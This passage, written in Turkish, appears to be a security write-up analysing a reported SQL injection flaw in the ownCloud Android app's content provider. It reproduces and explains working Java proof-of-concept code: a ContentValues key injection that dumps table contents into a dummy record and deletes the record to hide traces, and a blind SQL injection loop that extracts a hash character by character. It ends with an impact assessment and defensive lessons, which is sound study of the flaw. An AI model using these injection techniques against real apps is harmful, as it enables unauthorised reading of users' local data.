newOwncloudFile() fonksiyonu tüm zorunlu kolonlara sahte değerler koyuyor:
 
```java
private static ContentValues newOwncloudFile() throws Exception {
    ContentValues values = new ContentValues();
    values.put("parent", "a");
    values.put("filename", "a");
    values.put("created", "a");
    values.put("modified", "a");
    values.put("modified_at_last_sync_for_data", "a");
    values.put("content_length", "a");
    values.put("content_type", "a");
    values.put("media_path", "a");
    values.put("path", "a");
    values.put("file_owner", "a");
    values.put("last_sync_date", "a");
    values.put("last_sync_date_for_data", "a");
    values.put("etag", "a");
    values.put("share_by_link", "a");
    values.put("shared_via_users", "a");
    values.put("permissions", "a");
    values.put("remote_id", "a");
    values.put("update_thumbnail", "a");
    values.put("is_downloading", "a");
    values.put("etag_in_conflict", "a");
    return values;
}
```
 
Tüm kolonlara 'a' değeri konmuş. Değerlerin ne olduğu önemli değil, önemli olan bir kaydın oluşması. Bu kayıt, sonraki adımda manipüle edilecek bir "taşıyıcı kayıt."
 
Bu adım kaynak kodda şu akışı takip ediyor: insert() (Satır 183) → private insert() (Satır 197) → ROOT_DIRECTORY, SINGLE_FILE bloğu → db.insert() (Satır 217). Kod, duplicate kontrolü yapıyor (doubleCheck) ama ilk ekleme olduğu için geçecek.
 
### Adım 2 — Update + ContentValues Key Injection
 
```java
ContentValues updateValues = new ContentValues();
updateValues.put(
    "etag=?,path=(SELECT GROUP_CONCAT(" + columnName + ",'\\n') " +
    "FROM " + tableName + ") " +
    "WHERE _id=" + result.getLastPathSegment() + "-- -",
    "a"
);
Log.e("test", "" + ctx.getContentResolver().update(
    result, updateValues, null, null));
```
 
Bu kodu yavaş yavaş çözelim. ContentValues.put(key, value) normalde şöyle kullanılır:
 
```java
// Normal kullanım:
values.put("filename", "my_photo.jpg")
// Oluşan SQL: UPDATE files SET filename=? WHERE ...
// ? yerine "my_photo.jpg" gelir
```
 
Ama saldırgan KEY olarak şunu gönderiyor (diyelim columnName="name", tableName="SQLITE_MASTER"):
 
```
KEY = "etag=?,path=(SELECT GROUP_CONCAT(name,'\n') FROM SQLITE_MASTER) WHERE _id=42-- -"
VALUE = "a"
```
 
Android bu ContentValues'i şöyle bir UPDATE SQL'ine çevirir:
 
```sql
UPDATE files SET
    etag=?,path=(SELECT GROUP_CONCAT(name,'\n') FROM SQLITE_MASTER)
    WHERE _id=42-- - = ?
WHERE (orijinal_where_kosulu)
```
 
Ne oldu burada? Key olarak gönderilen string, SQL SET cümlesinin yapısını tamamen değiştirdi:
 
1. **etag=?** — etag kolonuna ? (yani 'a') atanıyor.
2. **path=(SELECT GROUP_CONCAT(name,'\n') FROM SQLITE_MASTER)** — İŞTE SALDIRI! path kolonu, SQLITE_MASTER tablosundaki tüm tablo isimlerini birleştiren bir subquery sonucuyla güncelleniyor.
3. **WHERE _id=42** — Saldırgan kendi WHERE koşulunu enjekte ediyor, sadece kendi eklediği sahte kaydı güncelliyor.
4. **-- -** — SQL yorum işareti. Bundan sonraki her şey (orijinal WHERE koşulu dahil) yok sayılıyor.
 
Bu adım kaynak kodda update() (Satır 444) → private update() (Satır 458) → else bloğu (Satır 482–484) akışını takip ediyor. else bloğu db.update(ProviderTableMeta.FILE_TABLE_NAME, values, selection, selectionArgs) çağrısı yapıyor ve values parametresi hiç doğrulanmadan SQL'e giriyor.
 
**GROUP_CONCAT() nedir?** SQL'de birden fazla satırın değerlerini tek bir string'e birleştiren fonksiyon. Mesela tabloda 3 satır varsa: 'files', 'uploads', 'capabilities' → 'files\nuploads\ncapabilities' döner. Saldırgan bunu kullanarak tüm tablodan verileri tek seferde çekebiliyor.
 
### Adım 3 — Query
 
```java
String query = query(ctx, new String[]{"path"},
    "_id=?", new String[]{result.getLastPathSegment()});
```
 
Saldırgan, az önce manipüle ettiği kaydın path kolonunu okuyor. path artık "a" değil, SQLITE_MASTER tablosundaki tüm tablo isimlerini içeriyor.
 
Bu tamamen normal, meşru bir query — hiçbir SQL Injection yok bu query'de. Veri zaten önceki adımda çalınmış ve path'e yazılmıştı. Bu akış kaynak kodda query() (Satır 304) → SINGLE_FILE bloğu (Satır 331–335) → sqlQuery.query() (Satır 402) yolunu izliyor.
 
### Adım 4 — Delete
 
```java
public static String deleteFile(Context ctx, String id) throws Exception {
    ctx.getContentResolver().delete(
        Uri.parse("content://org.owncloud/file/" + id),
        null, null
    );
    return "1";
}
deleteFile(ctx, result.getLastPathSegment());
```
 
Sahte kayıt siliniyor. Veritabanında saldırının izi kalmıyor.
 
### exploit() Fonksiyonu
 
Sonuç olarak exploit() fonksiyonu, zafiyeti bir veritabanı okuma API'sine dönüştürmüş durumda. Saldırgan istediği tablo ve kolonu parametre olarak veriyor:
 
```java
// Tüm tablo isimlerini çal:
exploit(context, "name", "SQLITE_MASTER WHERE type=\"table\"")
// Tüm hesap sahiplerini çal:
exploit(context, "file_owner", "files")
// Tüm dosya yollarını çal:
exploit(context, "path", "files")
// Upload geçmişini çal:
exploit(context, "local_path", "uploads")
```
 
Orijinal rapor bu exploit'in sonucunu şöyle tanımlıyor: "By providing a columnName and tableName to the exploit function, the attacker takes advantage of the issues explained above to: 1) Create a new file entry, 2) Exploit the SQL Injection in the update method to set the path… 3) Query the path… 4) Delete the file entry."
 
## Bölüm 4: PoC #2 — Blind SQL Injection ile owncloud_database'e Erişim
 
ownCloud, verilerini iki farklı mimarideki veritabanında saklar:
 
**filelist**: Doğrudan erişime açık eski SQLite yapısıdır (files, uploads vb. tablolar).
 
**owncloud_database**: Kısıtlı erişime sahip modern Room ORM yapısıdır (shares, folder_backup vb. tablolar).
 
İlk PoC'de filelist hedef alındığı için standart ContentValues key injection çalışıyordu. Fakat SHARES tablosu owncloud_database içinde yer alıyor. Bu veritabanında isStrict=true ve "projection map" korumaları aktif olduğu için, sorgu sonuçlarının dışarıdan doğrudan okunması imkansızdır. Sonuçlar doğrudan görülemediği için de saldırganın verileri sızdırmak adına Blind SQL Injection tekniğini kullanmaktan başka çaresi kalmamaktadır.
 
### Blind SQL Injection Nedir?
 
Normal SQL Injection'da saldırgan çalınan veriyi doğrudan görebilir (mesela PoC #1'de path alanında). Ama bazen bu mümkün değildir. Blind SQL Injection'da saldırgan veriyi doğrudan göremez, ama evet/hayır soruları sorarak veriyi tahmin eder.
 
```java
public static String blindExploit(Context ctx) {
    String output = "";
    String chars = "abcdefghijklmopqrstuvwxyz0123456789";
```
 
- **output**: Şu ana kadar tahmin edilen karakterler. Başta boş.
- **chars**: Denenecek karakter seti. Her pozisyon için bu karakterler tek tek denenecek.
 
```java
while (true) {
        int outputLength = output.length();
        for (int i = 0; i < chars.length(); i++) {
            char candidate = chars.charAt(i);
            String attempt = String.format("%s%c%s", output, candidate, "%");
```
 
Her iterasyonda attempt, şu ana kadar tahmin edilen karakterlere bir aday ekleyip sonuna % (SQL LIKE joker karakteri) koyuyor. Örneğin output = "ab" ve candidate = "c" ise, attempt = "abc%" — yani "abc ile başlayan herhangi bir şey."
 
```java
try (Cursor mCursor = ctx.getContentResolver().query(
                    Uri.parse("content://org.owncloud/shares"),
                    null,
                    "'a'=? AND (SELECT identity_hash FROM room_master_table) LIKE '"
                        + attempt + "'",
                    new String[]{"a"},
                    null)) {
```
 
selection parametresine SQL subquery enjekte ediliyor. Bu, kaynak kodda query() (Satır 304) → SHARES bloğu (Satır 337–353) → .selection(selection, selectionArgs) (Satır 341) akışını takip ediyor.
 
Oluşan WHERE koşulu:
 
```sql
WHERE 'a'='a'                                                    -- her zaman true
  AND (SELECT identity_hash FROM room_master_table) LIKE 'abc%'   -- tahmin kontrolü
```
 
**'a'=? kısmı neden var?** Kaynak kodun Satır 311'deki kontrolünü bypass etmek için: selection != null && selectionArgs == null kontrolü var. Saldırgan selectionArgs olarak {"a"} gönderiyor ve selection'da ? kullanıyor. Kontrol geçiliyor.
 
**Subquery ne yapıyor?** room_master_table tablosundaki identity_hash değerini okuyor ve attempt ile karşılaştırıyor. Eğer hash "abc" ile başlıyorsa LIKE eşleşir ve sorgu sonuç döner (count > 0). Eşleşmezse sonuç boş döner. Bu tablo ContentProvider üzerinden erişilebilir değil — ama SQL Injection ile çapraz sorgu yapılabiliyor çünkü owncloud_database içindeki shares tablosu üzerinden room_master_table'a subquery atılıyor.
 
```java
if (mCursor.getCount() > 0) {
                    output += candidate;   // Doğru karakter bulundu!
                    Log.i("evil", output);
                    break;
                }
            }
        }
        if (output.length() == outputLength)
            break;   // Hiçbir karakter eşleşmedi, hash bitti
    }
    return output;
}
```
 
Sonuç satır sayısı > 0 ise tahmin doğru — o karakter output'a ekleniyor ve bir sonraki pozisyona geçiliyor. Eğer bir tam turda (tüm chars denendi) hiçbir karakter eşleşmediyse, hash'in sonuna ulaşılmış demektir. Döngü biter, çalınan hash döndürülür.
 
## Bölüm 5: Impact (Etki) Analizi
 
Raporun etki değerlendirmesi, zafiyetin sınırlarını son derece şeffaf ve objektif bir şekilde ortaya koyarak araştırmanın güvenilirliğini artırıyor. Etki analizi, hedef alınan veritabanına göre iki farklı boyutta incelenmektedir:
 
### 1. filelist Veritabanı: Sınırlı Mevcut Etki ve Gelecek Riski
 
Orijinal raporda şu ifadeye yer veriliyor: "Despite that, currently all tables are legitimately exposed through the content provider itself, so the injections cannot be exploited to obtain any extra data."
 
Araştırmacı burada oldukça şeffaf bir değerlendirme yapıyor: filelist veritabanındaki tablolar, halihazırda Content Provider üzerinden (herhangi bir izin gerektirmeksizin, exported=true olarak) dışarıya açıktır. Dolayısıyla, SQL Injection ile çekilebilecek veriler zaten normal sorgularla da elde edilebilen verilerdir. Anlık senaryoda fazladan bir bilgi sızıntısı (data leak) gerçekleşmemektedir.
 
Fakat rapor hemen ardından kritik bir uyarı ekliyor: "Nonetheless, if new tables were added in the future that were not accessible through the content provider, those could be accessed using these vulnerabilities." Bu durum, zafiyetin geleceğe yönelik potansiyelini vurguluyor. Geliştiriciler ilerleyen sürümlerde bu veritabanına Content Provider üzerinden erişilemeyen, hassas veriler (örneğin session token'ları veya şifreler) içeren yeni tablolar eklerse, mevcut SQL Injection zafiyeti doğrudan bu kritik verilerin çalınmasına yol açacaktır.
 
### 2. owncloud_database: Gerçek ve Mevcut Etki
 
Orijinal rapordaki şu cümle asıl tehlikeyi özetliyor: "Regarding the tables in owncloud_database, there are two that are not accessible through the content provider: room_master_table and folder_backup."
 
Zafiyetin gerçek ve ölçülebilir etkisi tam olarak burada ortaya çıkıyor. owncloud_database içerisinde yer alan bu iki tablo, Content Provider üzerinden dışarıya kapalıdır. Ancak keşfedilen SQL Injection zafiyeti sayesinde saldırgan bu korumayı aşarak aşağıdaki hassas tablolara erişebilir:
 
- **room_master_table**: Room ORM'in iç işleyişini yöneten tablodur. İçerisindeki identity_hash değeri, veritabanı şema versiyonunu tanımlar. Bir saldırgan bu değeri okuyarak uygulamanın tam sürümünü ve veritabanı yapısının haritasını çıkarabilir (keşif/reconnaissance aşaması için kritik bir veridir).
- **folder_backup**: Kamera ve dosya yedekleme yapılandırmalarını tutan tablodur. Kullanıcının hangi klasörleri yedeklediği ve kişisel yedekleme tercihleri gibi bilgiler içerir. Bu verilerin sızdırılması, doğrudan bir gizlilik (privacy) ihlalidir ve kullanıcı verilerinin güvenliğini tehlikeye atar.
 
## Sonuç
 
Bu rapor yanlış veya kontrolsüz konfigürasyonun geniş bir attack surface i yaratığını göstermektedir.
 
UriMatcher bir güvenlik mekanizması değildir. # pattern'i sadece routing içindir, input validation yapmaz. URI segment'leri her zaman ayrıca doğrulanmalı.
 
Tutarsız güvenlik uygulaması en yaygın sorunlardan biridir. Aynı dosyada bir blokta appendWhereEscapeString kullanıp diğerlerinde appendWhere kullanmak, code review'ın sistematik yapılmadığının göstergesi.
 
Blind SQL Injection riski herzaman vardır. Doğrudan veri sızdırma engellenmiş olsa bile, evet/hayır soruları sorarak veri harf harf çıkarılabilir.
 
Sonuç olarak, güvenli mimari prensiplerinin uygulamanın sadece belirli modüllerinde değil, bütüncül bir yaklaşımla her katmanında tavizsiz bir şekilde uygulanması şarttır.
 